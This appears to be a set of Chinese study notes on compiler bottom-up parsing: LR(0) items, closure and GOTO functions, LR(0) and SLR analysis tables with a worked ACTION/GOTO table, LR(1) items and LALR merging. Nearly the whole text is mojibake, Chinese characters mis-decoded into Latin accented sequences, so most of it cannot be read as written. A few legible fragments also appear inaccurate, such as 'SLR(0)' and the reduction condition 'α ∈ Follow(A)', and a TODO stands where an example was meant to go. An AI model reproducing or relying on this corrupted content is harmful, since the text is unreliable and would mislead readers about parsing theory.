ˆ\nç§»è¿›ï¼š\nå½’çº¦ï¼š\næ¥å—\u0026æŠ¥é”™ï¼š\næ‰€ä»¥å„ç§LRåˆ†æå™¨çš„æœ€å¤§åŒºåˆ«åœ¨äºå…¶åˆ†æè¡¨ï¼Œåˆ†æè¡¨å†³å®šäº†æ¯ä¸€æ­¥è¯¥å¦‚ä½•ç§»è¿›æˆ–è€…å½’çº¦ï¼Œç›´è‡³æ¥å—ï¼Œæˆ–è€…ä¸­é€”æŠ¥é”™ã€‚\nLR(0)åˆ†æè¡¨çš„æ„é€  1.è§„èŒƒå¥å‹çš„æ´»å‰ç¼€\n**å‰ç¼€ï¼š**ä¸€ä¸ªç¬¦å·ä¸²çš„å‰ç¼€æ˜¯æŒ‡è¯¥ä¸²çš„ä»»æ„é¦–éƒ¨(åŒ…æ‹¬Îµ)ã€‚\nâ€‹\tä¾‹ï¼šabcçš„å‰ç¼€ä¸ºï¼šÎµï¼Œaï¼Œabï¼Œabc\nå½’çº¦æ—¶ï¼Œå½’çº¦å‰å’Œå½’çº¦åçš„è¢«å½’çº¦éƒ¨åˆ†ä¸å‰©ä½™éƒ¨åˆ†åˆèµ·æ¥ä»…æ„æˆæ–‡æ³•çš„è§„èŒƒå¥å‹ï¼Œè€Œç”¨å“ªä¸ªäº§ç”Ÿå¼å½’çº¦ä»…å–å†³äºå½“å‰å¥å‹çš„å‰é¢éƒ¨åˆ†ï¼›X1X2â€¦Xn[p]ï¼Œå…¶ä¸­Xiä¸ºæ–‡æ³•çš„ç¬¦å·ï¼Œ[p]ä¸ºç¬¬pä¸ªäº§ç”Ÿå¼åºå·\n æˆ‘ä»¬æŠŠè§„èŒƒå¥å‹çš„è¿™ç§å‰ç«¯éƒ¨åˆ†çš„ä¸²ç§°ä¸ºæ´»å‰ç¼€ã€‚å®é™…ä¸Šï¼Œå®ƒä»¬æ°å¥½æ˜¯ç¬¦å·æ ˆæ ˆé¡¶å½¢æˆå¥æŸ„æ—¶ç¬¦å·æ ˆä¸­çš„å†…å®¹ã€‚  **æ´»å‰ç¼€ï¼š**æ˜¯æŒ‡è§„èŒƒå¥å‹çš„ä¸€ä¸ªå‰ç¼€ï¼Œè¿™ç§å‰ç¼€ä¸å«å¥æŸ„ä¹‹åçš„ä»»ä½•ç¬¦å·ã€‚\n è¿™æ˜¯å› ä¸ºä¸€æ—¦å¥å‹çš„å¥æŸ„åœ¨ç¬¦å·æ ˆé¡¶å½¢æˆï¼Œå°†ä¼šç«‹å³è¢«å½’çº¦ä¹‹æ•…ã€‚æ‰€ä»¥æˆ‘ä»¬å°†è§„èŒƒå¥å‹å…·æœ‰ä¸Šè¿°æ€§è´¨ï¼ˆä¸å«å¥æŸ„ä¹‹åçš„ä»»ä½•ç¬¦å·ï¼‰çš„å‰ç¼€ç§°ä¹‹ä¸ºæ´»å‰ç¼€ã€‚  åœ¨è§„èŒƒå½’çº¦è¿‡ç¨‹ä¸­çš„ä»»ä½•æ—¶å€™åªè¦å·²åˆ†æè¿‡çš„éƒ¨åˆ†å³åœ¨ç¬¦å·æ ˆä¸­çš„ç¬¦å·ä¸²ä¸ºè§„èŒƒå¥å‹çš„æ´»å‰ç¼€ï¼Œè¡¨æ˜è¾“å…¥ä¸²çš„å·²è¢«åˆ†æè¿‡çš„éƒ¨åˆ†æ˜¯è¯¥æ–‡æ³•æŸè§„èŒƒå¥å‹çš„ä¸€ä¸ªæ­£ç¡®éƒ¨åˆ†ã€‚\n å®šä¹‰ï¼šè‹¥ S=*Râ‡’ Î±AÏ‰ =Râ‡’ Î±Î²Ï‰ æ˜¯æ–‡æ³•Gçš„ä¸€ä¸ªè§„èŒƒæ¨å¯¼ï¼Œå¦‚æœç¬¦å·ä¸²Î³æ˜¯ Î±Î² çš„å‰ç¼€ï¼Œåˆ™ç§°Î³æ˜¯Gçš„ä¸€ä¸ªæ´»å‰ç¼€ã€‚å…¶ä¸­Sä¸ºæ–‡æ³•å¼€å§‹ç¬¦å·  LR(0)é¡¹ç›®  æ´»å‰ç¼€å’Œå¥æŸ„é—´çš„å…³ç³»ï¼š\n(1) æ´»å‰ç¼€ä¸­å·²å«æœ‰å¥æŸ„çš„å…¨éƒ¨ç¬¦åˆï¼ˆå¥æŸ„çš„æœ€åç¬¦å·å°±æ˜¯æ´»å‰ç¼€çš„æœ€åç¬¦å·ï¼‰\n(2) æ´»å‰ç¼€åªå«æœ‰å¥æŸ„çš„å‰éƒ¨åˆ†ç¬¦å·ï¼ˆå¥æŸ„çš„æœ€å·¦å­ä¸²ä¸ºæ´»å‰ç¼€çš„æœ€å³å­ä¸²ï¼‰\n(3) æ´»å‰ç¼€ä¸­å…¨ç„¶ä¸åŒ…æ‹¬å¥æŸ„çš„ä»»ä½•ç¬¦å·\n (1) è¡¨æ˜ï¼šæ­¤æ—¶æŸä¸€äº§ç”Ÿå¼ A â†’ Î² çš„å³éƒ¨ Î² å·²å‡ºç°åœ¨ç¬¦å·æ ˆé¡¶ï¼Œå› æ­¤æ­¤æ—¶ç›¸åº”çš„åˆ†æåŠ¨ä½œåº”å½“æ˜¯ç”¨æ­¤äº§ç”Ÿå¼è¿›è¡Œå½’çº¦ã€‚\n(2) è¡¨æ˜ï¼šå½¢å¦‚ A â†’ Î²1 Î²2 çš„äº§ç”Ÿå¼çš„å³éƒ¨å­ä¸²å·²åœ¨ç¬¦å·æ ˆæ ˆé¡¶äº†ï¼Œå¦‚ Î²1 ï¼Œæ­£æœŸå¾…ç€ä»ä½™ç•™è¾“å…¥ä¸²ä¸­èƒ½çœ‹åˆ°ç”±Î²æ¨å‡ºçš„ç¬¦å·ä¸²ï¼Œå³æœŸå¾… Î²2 è¿›æ ˆä»¥ä¾¿èƒ½è¿›è¡Œå½’çº¦ã€‚æ•…æ­¤æ—¶åˆ†æåŠ¨ä½œæ˜¯ç§»è¿›å½“å‰è¾“å…¥ç¬¦å·\n(3) è¡¨æ˜ï¼šæœŸæœ›ä»ä½™ç•™è¾“å…¥ä¸²ä¸­èƒ½çœ‹åˆ°æŸäº§ç”Ÿå¼ A â†’ Î± çš„å³éƒ¨ï¼Œå³Î±æ‰€ä»£è¡¨çš„ç¬¦å·ä¸²ï¼ˆå³å¥æŸ„ï¼‰ï¼Œæ‰€ä»¥æ­¤æ—¶åˆ†æçš„åŠ¨ä½œä¹Ÿæ˜¯è¯»è¾“å…¥ç¬¦è¿›ç¬¦å·æ ˆã€‚\nåœ¨äº§ç”Ÿå¼çš„å³éƒ¨ç›¸åº”ä½ç½®ä¸ŠåŠ ä¸€ä¸ªåœ†ç‚¹ . ï¼Œæ¥æŒ‡ç¤ºè¯†åˆ«ä½ç½®ï¼Œæ ‡æ˜åœ¨ . å‰çš„éƒ¨åˆ†å·²è¢«è¯†åˆ«\nå¦‚ (1) A â†’ Î². (2) A â†’ Î²1.Î²2 (3) A â†’ .Î±\nå³éƒ¨æŸä½ç½®ä¸Šæ ‡æœ‰åœ†ç‚¹çš„äº§ç”Ÿå¼ç§°ä¸ºLR(0)é¡¹ç›®(item)ã€‚\nä¸åŒçš„LR(0)é¡¹ç›®ï¼Œåæ˜ äº†åˆ†æè¿‡ç¨‹ä¸­ç¬¦å·æ ˆé¡¶çš„ä¸åŒæƒ…å†µã€‚\næ¯ä¸ªé¡¹ç›®çš„æ„ä¹‰ä¸åœ†ç‚¹çš„ä½ç½®æœ‰å…³\nåœ†ç‚¹å·¦è¾¹çš„å­ä¸²è¡¨ç¤ºåœ¨åˆ†æè¿‡ç¨‹çš„æŸä¸€æ—¶åˆ»ç”¨è¯¥äº§ç”Ÿå¼å½’çº¦æ—¶å¥æŸ„ä¸­å·²è¯†åˆ«è¿‡çš„éƒ¨åˆ†ï¼Œåœ†ç‚¹å³è¾¹çš„å­ä¸²è¡¨ç¤ºå¾…è¯†åˆ«çš„éƒ¨åˆ†\næ–‡æ³•çš„å…¨éƒ¨LR(0)é¡¹ç›®å°†æ˜¯æ„é€ ä»–çš„æ‰€æœ‰æ´»å‰ç¼€çš„æœ‰ç©·è‡ªåŠ¨æœºçš„åŸºç¡€\nLR(0)é¡¹ç›®çš„åˆ†ç±»  A â†’ Î±.ï¼šè¡¨æ˜å³éƒ¨ç¬¦å·ä¸²å·²å‡ºç°åœ¨æ ˆé¡¶ï¼Œæ­¤æ—¶ç›¸åº”çš„åˆ†æåŠ¨ä½œåº”å½“æ˜¯æŒ‰æ­¤äº§ç”Ÿå¼è¿›è¡Œå½’çº¦ï¼Œæ­¤ç§é¡¹ç›®ç§°ä¸ºè§„çº¦é¡¹ç›®ã€‚ S' â†’ S.ï¼šç§°ä¸ºæ¥å—é¡¹ç›®ã€‚ A â†’ Î±.XÎ²ï¼šå…¶ä¸­Î±å¯ä»¥ä¸ºÎµï¼Œå½“Xä¸ºç»ˆç»“ç¬¦æ—¶ï¼Œç›¸åº”çš„åˆ†æåŠ¨ä½œåº”å°†å½“å‰çš„ç¬¦å·ç§»å…¥æ ˆä¸­ï¼Œå°†æ­¤é¡¹ç›®ç§°ä¸ºç§»è¿›é¡¹ç›®ã€‚ A â†’ Î±.XÎ²ï¼šå…¶ä¸­Î±å¯ä»¥ä¸ºÎµï¼Œå½“Xä¸ºéç»ˆç»“ç¬¦æ—¶ï¼ŒæœŸå¾…ä»ä½™ç•™çš„è¾“å…¥ç¬¦ä¸­è¿›è¡Œå½’çº¦åè€Œå¾—åˆ°Xï¼Œæ­¤ç±»é¡¹ç›®ç§°ä¸ºå¾…çº¦é¡¹ç›®ã€‚  æŠŠç»ˆç»“ç¬¦å’Œéç»ˆç»“ç¬¦éƒ½å¯çœ‹æˆä¸€ä¸ªæœ‰é™è‡ªåŠ¨æœºçš„è¾“å…¥ç¬¦å·ï¼Œæ¯æŠŠä¸€ä¸ªç¬¦å·è¿›æ ˆç›¸å½“äºå·²è¯†åˆ«è¿‡è¯¥ç¬¦å·ï¼Œè€ŒçŠ¶æ€è¿›è¡Œè½¬æ¢ï¼ˆåˆ°ä¸‹ä¸€ä¸ªçŠ¶æ€ï¼‰ï¼Œå½“è¯†åˆ«åˆ°å¯å½’çº¦å‰ç¼€æ—¶ç›¸å½“äºæ ˆé¡¶å·²å½¢æˆå¥æŸ„ï¼Œåˆ™è®¤ä¸ºè¾¾åˆ°äº†è¯†åˆ«å¥æŸ„çš„ç»ˆæ€ã€‚ã€\n==\u003e\u003e\u003eæ„é€ è¯†åˆ«æ´»å‰ç¼€çš„DFAï¼šDFAä¸­çš„æ¯ä¸€ä¸ªçŠ¶æ€ç”±è‹¥å¹²ä¸ªLR(0)é¡¹ç›®æ‰€ç»„æˆçš„é›†åˆ(ç§°ä¸ºé¡¹ç›®é›†)æ¥è¡¨ç¤ºã€‚\nä¸¾ä¾‹ï¼šæ„é€ è¯†åˆ«å‰ç¼€çš„DFA ç”¨I0è¡¨ç¤ºè¿™ä¸ªDFAçš„åˆæ€ï¼Œ å°†é¡¹ç›®S'â†’.Såˆ—å…¥é¡¹ç›®é›†I0ã€‚ å°†é¡¹ç›®Sâ†’.Aå’ŒSâ†’.BåŠ å…¥I0ä¸­ã€‚ å°†Aâ†’.aAbå’ŒAâ†’.cå’ŒBâ†’.aBb, Bâ†’.dåŠ å…¥I0ä¸­ã€‚ é¡¹ç›®é›†I0å°†ç”±å¦‚ä¸‹é¡¹ç›®ç»„æˆï¼š I0 : S'â†’.S, Sâ†’.A, Sâ†’.B, Aâ†’.aAb, Aâ†’.c, Bâ†’.aBd, Bâ†’.d \u003e\u003e\u003e S'â†’.Sç§°ä¸ºé¡¹ç›®é›†I0çš„åŸºæœ¬é¡¹ç›®ï¼Œä»åŸºæœ¬é¡¹ç›®å‡ºå‘æ„é€ é¡¹ç›®é›†I0çš„è¿‡ç¨‹ï¼Œå¯ç”¨closure({S'â†’.S})è¡¨ç¤ºã€‚ closure(I)çš„å®šä¹‰: Closure(I) = I âˆª { A â†’ .Î¼ | A â†’ Î¼âˆˆG âˆ§ Kâ†’ Î±.AÎ²âˆˆclosure(I) âˆ§ Î±âˆˆVâˆ§Î²âˆˆV}\næ„é€ closure(I)çš„ç®—æ³•: 1ï¼‰I ä¸­çš„æ¯ä¸€ä¸ªé¡¹ç›®éƒ½å±äº closure(I) 2ï¼‰è‹¥å½¢å¦‚ Kâ†’Î±.AÎ² çš„é¡¹ç›®å±äºIï¼Œä¸” Aâ†’Î¼ æ˜¯æ–‡æ³•çš„ä¸€ä¸ªäº§ç”Ÿå¼ï¼Œä»»ä½•å½¢å¦‚ Aâ†’.Î¼ çš„é¡¹ç›®ä¹Ÿåº”åŠ åˆ° closure(I) ä¸­ 3ï¼‰é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´è‡³ä¸å†æœ‰æ–°çš„é¡¹ç›®åŠ å…¥åˆ°closure(I)ä¸­ä¸ºæ­¢ã€‚\nå¦‚ä½•ç¡®å®šä»I0å¯èƒ½è½¬ç§»åˆ°çš„ä¸‹ä¸€çŠ¶æ€ï¼Ÿ\nè‹¥I0ä¸­æœ‰é¡¹ç›® Kâ†’a **.**Abï¼Œä»è¾“å…¥ä¸²è¯†åˆ«å‡ºAåï¼Œè¿›å…¥ä¸‹ä¸€çŠ¶æ€ã€‚è®¾æ­¤çŠ¶æ€ä¸º Ii ï¼Œæ˜¾ç„¶ Ii ä¸­å¿…å«æœ‰å½¢å¦‚ Kâ†’aA .b çš„é¡¹ç›®ï¼Œç§°ä¸º Kâ†’a .Ab çš„åç»§é¡¹ç›®ã€‚åç»§é¡¹ç›®ç»„æˆé›†åˆ Jï¼Œåˆ™Jä¸­çš„æ¯ä¸ªé¡¹ç›®éƒ½æ˜¯é¡¹ç›®é›† Ii çš„åŸºæœ¬é¡¹ç›®ï¼Œæœ‰ï¼š Ii =closure( J )\nå®šä¹‰çŠ¶æ€è½¬ç§»å‡½æ•°ï¼šGOTO(I,A)=closure(J) å…¶ä¸­ï¼ŒI æ˜¯å½“å‰çŠ¶æ€ï¼ŒAä¸ºæ–‡æ³•ç¬¦å·ï¼ŒJ æ˜¯ I ä¸­æ‰€æœ‰å½¢å¦‚Kâ†’a**.**Abçš„é¡¹ç›®ä¹‹åç»§é¡¹ç›®Kâ†’aA**.**bæ‰€ç»„æˆçš„é›†åˆï¼Œè€Œclosure(J)å°±æ˜¯é¡¹ç›®é›† Iï¼ˆå³çŠ¶æ€I)å…³äºç¬¦å·Açš„åç»§é¡¹ç›®é›†ï¼ˆå³åç»§çŠ¶æ€ï¼‰ã€‚\nå°†G[S']çš„å…¨éƒ¨é¡¹ç›®é›†ç§°ä¸ºæ–‡æ³•G[S']çš„LR(0)é¡¹ç›®é›†è§„èŒƒæ—ï¼Œå¹¶è®°ä¸ºC=(I0 ï¼ŒI1 ï¼ŒI2 ï¼Œâ€¦â€¦ï¼ŒIn )\nè¯†åˆ«æ–‡æ³•G[S']çš„å…¨éƒ¨æ´»å‰ç¼€çš„DFAä¸º M = ( Cï¼ŒVï¼ŒGoTo ï¼Œ I0 ï¼Œ Z )\nå…¶ä¸­ï¼ŒCï¼šMçš„çŠ¶æ€é›†ï¼Œå³æ–‡æ³•G[S'] çš„LR(0) é¡¹ç›®é›†è§„èŒƒæ— I0 ~~~ In\nVï¼šMçš„å­—æ¯è¡¨ï¼Œå³åœ¨Mä¸­çš„æ‰€æœ‰ç¬¦å·\nGoToï¼šMçš„çŠ¶æ€è½¬æ¢å‡½æ•°ï¼Œå³ä¸Šè¿°çš„GoToå‡½æ•°\nI0 ï¼šMçš„å”¯ä¸€åˆæ€\nZï¼šMçš„ç»ˆæ€é›†ï¼ŒZ âŠ‚ C ä¸ºè§„èŒƒæ—ä¸­æ‰€æœ‰å«æœ‰è§„çº¦é¡¹ç›®çš„é‚£äº›é¡¹ç›®é›†\nä¾‹å¦‚ä¸‹å›¾ï¼š\næ–‡æ³•G': (0) S' â†’ S (1) S â†’ A (2) S â†’ B (3) A â†’ aAb (4) A â†’ c (5) B â†’ aBd (6) B â†’ d å¦‚ä¸Šä¸ºä¸€ä¸ªDFAï¼Œé€šè¿‡è¯»å…¥å­—ç¬¦è¿›è¡ŒçŠ¶æ€è½¬æ¢ï¼Œä»¥åŠåœ¨æ¯ä¸ªçŠ¶æ€å†…è¿›è¡Œclosureé—­åŒ…ã€‚\nLR(0)åˆ†æè¡¨æ„é€  è¦æ±‚æ¯ä¸€ä¸ªé¡¹ç›®é›†ä¸­çš„çš„è¯¸é¡¹ç›®ä¸å‡ºç°ä¸‹åˆ—çš„æƒ…å†µï¼š\n  ï¼ˆ1ï¼‰ç§»è¿›é¡¹ç›®å’Œå½’çº¦é¡¹ç›®å¹¶å­˜ï¼Œå³å­˜åœ¨ç§»è¿›â€”å½’çº¦å†²çªï¼›\n  ï¼ˆ2ï¼‰å¤šä¸ªå½’çº¦é¡¹ç›®å¹¶å­˜ï¼Œå³å­˜åœ¨å½’çº¦â€”å½’çº¦å†²çªã€‚\n  â€‹ å¦‚æœä¸€ä¸ªæ–‡æ³•Gæ»¡è¶³ä¸Šè¿°æ¡ä»¶ï¼Œä¹Ÿå°±æ˜¯å®ƒçš„æ¯ä¸ªLR(0)é¡¹ç›®é›†ä¸­éƒ½ä¸å«æœ‰å†²çªçš„é¡¹ç›®ï¼Œåˆ™ç§°Gä¸ºLR(0)æ–‡æ³•ã€‚\nåªæœ‰å½“ä¸€ä¸ªæ–‡æ³•æ˜¯LR(0)æ–‡æ³•æ—¶ï¼Œæ‰èƒ½å¯¹å®ƒæ„é€ ä¸å«å†²çªåŠ¨ä½œçš„LR(0)åˆ†æè¡¨ã€‚\næ„é€ LR(0)åˆ†æè¡¨çš„ç®—æ³•ä¸ºï¼š (1)å¯¹äºæ¯ä¸€é¡¹ç›®é›†Iiä¸­å½¢å¦‚Aâ†’Î±.XÎ²çš„é¡¹ç›®ï¼Œä¸”æœ‰GO(Ii,X)=Ij, è‹¥Xä¸ºä¸€ç»ˆç»“ç¬¦å· a æ—¶ï¼Œåˆ™ç½®ACTION[i,a]=Sj; è‹¥Xä¸ºä¸€éç»ˆç»“ç¬¦å·æ—¶ï¼Œåˆ™ç½®GOTO[i,X]=j (2)è‹¥Iiä¸­æœ‰å½’çº¦é¡¹ç›®Aâ†’Î±. ,è®¾Aâ†’Î±ä¸ºæ–‡æ³•ç¬¬jä¸ªäº§ç”Ÿå¼ï¼Œåˆ™å¯¹æ–‡æ³•çš„ä»»ä½•ç»ˆç»“ç¬¦å’Œâ€œ#â€ï¼ˆå‡è®°ä¸ºaï¼‰,ç½®ACTION[i,a]=Rj (3)è‹¥æ¥å—é¡¹ç›®S'â†’S .å±äºIi ,åˆ™ç½®ACTION[i,#]=accã€‚ (4)åœ¨åˆ†æè¡¨ä¸­,å‡¡ä¸èƒ½æŒ‰ä¸Šè¿°è§„åˆ™å¡«å…¥ä¿¡æ¯çš„å…ƒç´ ,å‡ç½®ä¸ºâ€œå‡ºé”™â€ã€‚ å¦‚ä¸Šå›¾çš„DFAå¯æ„é€ åˆ†æè¡¨ä¸º: ACTION\tGOTO a\tb\tc\td\t#\tS A B 0\tS4\tS5\tS6\t1 2 3 1\tAcc 2\tR1\tR1\tR1\tR1\tR1 3\tR2\tR2\tR2\tR2\tR2 4\tS4\tS5\tS6\t7\t9 5\tR4\tR4\tR4\tR4\tR4 6\tR6\tR6\tR6\tR6\tR6 7\tS8 8\tR3\tR3\tR3\tR3\tR3 9\tS10 10\tR5\tR5\tR5\tR5\tR5 \u003e\u003e\u003e è¡¨ä¸­Riä»£è¡¨ç”¨ç¬¬iä¸ªäº§ç”Ÿå¼å½’çº¦,Siä»£è¡¨ç§»è¿›Actionè¡¨çš„ç¬¬iè¡Œ åˆ†æå™¨çš„å·¥ä½œè¿‡ç¨‹å¦‚ä¸‹ï¼š\næ ¹æ®è¾“å…¥ä¸²å½“å‰ç¬¦å· a å’Œ åˆ†ææ ˆæ ˆé¡¶çŠ¶æ€ i æŸ¥æ‰¾åˆ†æè¡¨åº”é‡‡å–çš„åŠ¨ä½œï¼š\n1ï¼‰è‹¥ACTION[i,a]=Sj, aâˆˆVT ,åˆ™æŠŠ a ç§»è¿›ç¬¦å·æ ˆï¼Œ j ç§»è¿›çŠ¶æ€æ ˆã€‚\n2ï¼‰è‹¥ACTION[i,a]=Rjï¼ŒaâˆˆVT æˆ– # ï¼Œåˆ™ç”¨ç¬¬jä¸ªäº§ç”Ÿå¼å½’çº¦ã€‚å¹¶å°†ä¸¤ä¸ªæ ˆçš„æŒ‡é’ˆå‡å»K(å…¶ä¸­ï¼ŒKä¸ºç¬¬j ä¸ªäº§ç”Ÿå¼å³éƒ¨çš„ä¸²é•¿åº¦ï¼‰ï¼Œå¹¶æŠŠäº§ç”Ÿå¼çš„å·¦éƒ¨ç¬¦å·Aå‹å…¥ç¬¦å·æ ˆï¼ŒåŒæ—¶ç”¨ç¬¦å·å¯¹ï¼ˆ Si-k , A )å»æŸ¥GOTOè¡¨ï¼ˆå…¶ä¸­Si-k ä¸ºçŠ¶æ€æ ˆå½“å‰æ ˆé¡¶å…ƒç´ ï¼Œè‹¥ GOTO[Si-k ,A] = j ,åˆ™jå‹å…¥çŠ¶æ€æ ˆï¼Œä½¿å¾—ä¸¤ä¸ªæ ˆå†…çš„å…ƒç´ ä¸€æ ·å¤šã€‚\n3ï¼‰è‹¥ACTION[i,a]=Acc,ï¼ˆæ­¤æ—¶aåº”ä¸ºâ€œ#â€å·ï¼‰ï¼Œåˆ™è¡¨æ˜åˆ†ææˆåŠŸï¼Œç»“æŸåˆ†æã€‚\n4ï¼‰è‹¥ACTION[i,a]=ç©ºç™½ï¼Œè½¬å‡ºé”™å¤„ç†ã€‚\nSLRåˆ†æè¡¨æ„é€  å¤§å¤šæ•°ç¨‹åºè®¾è®¡è¯­è¨€çš„æ–‡æ³•ä¸æ˜¯LR(0)æ–‡æ³•ã€‚\nå¯¹LR(0)è§„èŒƒæ—ä¸­æœ‰å†²çªçš„é¡¹ç›®é›†ï¼ˆçŠ¶æ€ï¼‰ç”¨å‘å‰æŸ¥ çœ‹ä¸€ä¸ªï¼ˆè¾“å…¥ï¼‰ç¬¦å·çš„åŠæ³•è¿›è¡Œå¤„ç†ï¼Œä»¥è§£å†³å†²çªã€‚å³ä¸ºSLR(1)ã€‚\nSLR(1) åˆ†æè¡¨æ„é€ ä¸LR(0) åˆ†æè¡¨æ„é€ åŸºæœ¬ç›¸åŒ\nSLR(1) ä¹‹æ‰€ä»¥æ˜¯1ï¼Œæ˜¯å› ä¸ºå‘å‰çœ‹äº†ä¸€æ­¥Followé›†ã€‚\nå‡å®šæœ‰ä¸€ä¸ªLR(0)è§„èŒƒæ—ä¸­å«æœ‰å¦‚ä¸‹é¡¹ç›®é›†(çŠ¶æ€)I: I={Xâ†’a.bÎ² , Aâ†’g. , Bâ†’d.}å…¶ä¸­a,b,g,dä¸ºç¬¦å·ä¸²ï¼ŒbâˆˆVT ,Iä¸­å«æœ‰ç§»è¿›â€”å½’çº¦å’Œå½’çº¦â€”å½’çº¦å†²çªã€‚ åªè¦FOLLOW(A)å’ŒFOLLOW(B)äº’ä¸ç›¸äº¤ï¼Œä¸”éƒ½ä¸åŒ…å«b,å³: FOLLOW(A)âˆ©FOLLOW(B)=Ï† FOLLOW(A)âˆ©{b}=Ï† FOLLOW(B)âˆ©{b}=Ï† å½“çŠ¶æ€Ié¢ä¸´æŸè¾“å…¥ç¬¦å·aæ—¶ï¼Œåˆ™åŠ¨ä½œä¸ºï¼š 1ï¼‰è‹¥a = b,åˆ™ç§»è¿›ã€‚ 2ï¼‰è‹¥a âˆˆ FOLLOW(A),åˆ™ç”¨äº§ç”Ÿå¼Aâ†’gå½’çº¦ã€‚ 3ï¼‰è‹¥a âˆˆ FOLLOW(B),åˆ™ç”¨äº§ç”Ÿå¼Bâ†’då½’çº¦ã€‚ ä¸€èˆ¬åœ°ï¼Œå¯¹äºLR(0)è§„èŒƒæ—çš„ä¸€ä¸ªé¡¹ç›®é›†Iå¯èƒ½å«æœ‰å¤šä¸ªç§»è¿›é¡¹ç›®å’Œå¤šä¸ªå½’çº¦é¡¹ç›®ï¼Œæˆ‘ä»¬å¯å‡è®¾é¡¹ç›®é›†Iä¸­æœ‰mä¸ªç§»è¿›é¡¹ç›®ï¼š A1â†’a1**.** b1b1, A2â†’ a2**.** b2b2, â€¦, Amâ†’ am**.** bmbm;åŒæ—¶å«æœ‰nä¸ªå½’çº¦é¡¹ç›®ï¼šB1â†’g1**.** , B2â†’ g2**.** ,â€¦, Bnâ†’ gn**.** ,åªè¦é›†åˆ{b1, b2,â€¦bm}å’ŒFOLLOW(B1),FOLLOW(B2),â€¦,FOLLOW(Bn) ä¸¤ä¸¤äº¤é›†éƒ½ä¸ºç©ºï¼Œåˆ™æˆ‘ä»¬ä»å¯ç”¨ä¸Šè¿°å½’åˆ™æ¥è§£å†³å†²çªï¼š\n1ï¼‰è‹¥aâˆˆ{b1, b2,â€¦,bm},åˆ™ç§»è¿›ã€‚\n2ï¼‰è‹¥aâˆˆFOLLOW(Bi),i=1,â€¦,nï¼Œåˆ™ç”¨ Biâ†’ gi è¿›è¡Œå½’çº¦ã€‚\n3ï¼‰æ­¤å¤–ï¼Œåˆ™æŠ¥é”™ã€‚\nSLRåˆ†æè¡¨æ„é€ æ–¹æ³• (1) å¯¹äºæ¯ä¸€é¡¹ç›®é›†Iiä¸­å½¢å¦‚A.Xçš„é¡¹ç›®ï¼Œä¸”æœ‰GOTO(Ii,X)=Ij, è‹¥Xä¸ºä¸€ç»ˆç»“ç¬¦å·aæ—¶ï¼Œåˆ™ç½®ACTION[I,a]=S; è‹¥Xä¸ºä¸€éç»ˆç»“ç¬¦å·æ—¶ï¼Œåˆ™ä»…ç½®GOTO[i,X]=jï¼›\n(2) è‹¥å½’çº¦é¡¹ç›®Aâ†’Î±**.** å±äºIi,è®¾Aâ†’Î±ä¸ºæ–‡æ³•ç¬¬jä¸ªè¡Œäº§ç”Ÿå¼ï¼Œåˆ™å¯¹ä»»ä½•å±äºFOLLOW(A)çš„è¾“å…¥ç¬¦å·a,ç½®ACTION[i,a]=Rjï¼›\n(3) è‹¥æ¥å—é¡¹ç›®S' â†’ S**.**å±äºIi ,åˆ™ç½®ACTION[i,#]=accã€‚\n(4) åœ¨åˆ†æè¡¨,å‡¡ä¸èƒ½æŒ‰ä¸Šè¿°è§„åˆ™å¡«å…¥ä¿¡æ¯çš„å…ƒç´ ,å‡ç½®ä¸ºâ€œå‡ºé”™â€ã€‚\nï¼ˆä¾‹ï¼šTODOï¼šåé¢è¡¥å……ï¼Œppt--Bottom-Up--P42-47ï¼‰\nè§„èŒƒLRåˆ†æè¡¨æ„é€  SLR(1) æ–¹æ³•ï¼šè‹¥çŠ¶æ€Kå«æœ‰ A â¡ Î±. ï¼Œè‹¥ Î± âˆˆ Follow(A) ï¼Œåˆ™ç”¨ A â¡ Î±.  å½’çº¦\nå½“çŠ¶æ€Ixä¸‹ï¼Œæœ‰äº§ç”Ÿå¼A â¡ Î±.  å’ŒA â¡ Î±. = â€¦ ï¼Œæ­¤æ—¶ï¼ŒSLR(0)ä¸çŸ¥é“æ˜¯å°†æ­¤å½’çº¦æˆAè¿˜æ˜¯ç§»è¿›è‡³=ï¼Œè‹¥æ²¡æœ‰å…¶ä»–æƒ…å†µèƒ½äº§ç”Ÿ=ï¼Œåˆ™è¿™é‡Œäº§ç”Ÿç§»è¿›å½’çº¦å†²çªï¼Œå¯¼è‡´é”™è¯¯ï¼ï¼ï¼\nLR(1)é¡¹ç›® (Aâ†’a**.** Î²ï¼Œx) è¡¨ç¤ºï¼š aåœ¨æ ˆé¡¶ï¼Œè¾“å…¥ä¸²å¤´éƒ¨å¯ç”±Î²xå¯¼å‡ºã€‚\nLR(1)çš„çŠ¶æ€ï¼šLR(1)é¡¹ç›®çš„é›†åˆ\nè¯¥ç®—æ³•ä¸º: ä»¤åˆæ€: Closure( (Sâ€™â†’.Sï¼Œ#) ) Closure(I)= repeat for any item( Aâ†’Î±.XÎ² ï¼Œz) in I for any production X â†’Î³ for any wâˆˆFIRST(Î²z) Iâ†Iâˆª{X â†’ .Î³, w} until I does not change GO (I,X)= J â†{} for any item(Aâ†’Î±.XÎ²ï¼Œz) in I add ( Aâ†’Î±X.Î²ï¼Œz ) to J return Closure(J) LALRåˆ†æè¡¨çš„æ„é€  åŒå¿ƒé¡¹ç›®é›†ï¼šé™¤å»æœç´¢ç¬¦ä¹‹å¤–éƒ½ç›¸åŒçš„LR(1)é¡¹ç›®é›†\nåˆå¹¶åŒå¿ƒé¡¹ç›®é›†ä¸ä¼šäº§ç”Ÿæ–°çš„ç§»è¿›-å½’çº¦å†²çª\nå°† LR(1) åˆå¹¶åŒå¿ƒé¡¹ç›®é›†ï¼Œå¦‚æœæ²¡æœ‰å½’çº¦-å½’çº¦å†²çªï¼Œåˆ™ä¸ºLALR(1)æ–‡æ³•ã€‚\n å‚è€ƒï¼Œå„è¯­æ³•åˆ†æå™¨çš„åŒºåˆ«\n  å„æ–‡æ³•çš„åŒºåˆ«ï¼š\n LL(1)å°±æ˜¯å‘å‰åªæœç´¢1ä¸ªç¬¦å·ï¼Œå³ä¸FIRST()åŒ¹é…ï¼Œå¦‚æœFIRSTä¸ºç©ºåˆ™è¿˜è¦è€ƒè™‘Followé›† \u003e\u003e\u003eè§åˆ°Firsté›†å°±ç§»è¿›ï¼Œè§åˆ°Followé›†å°±å½’çº¦ã€‚ LR(0):è§åˆ°Firsté›†å°±ç§»è¿›ï¼Œè§åˆ°ç»ˆæ€å°±å½’çº¦ 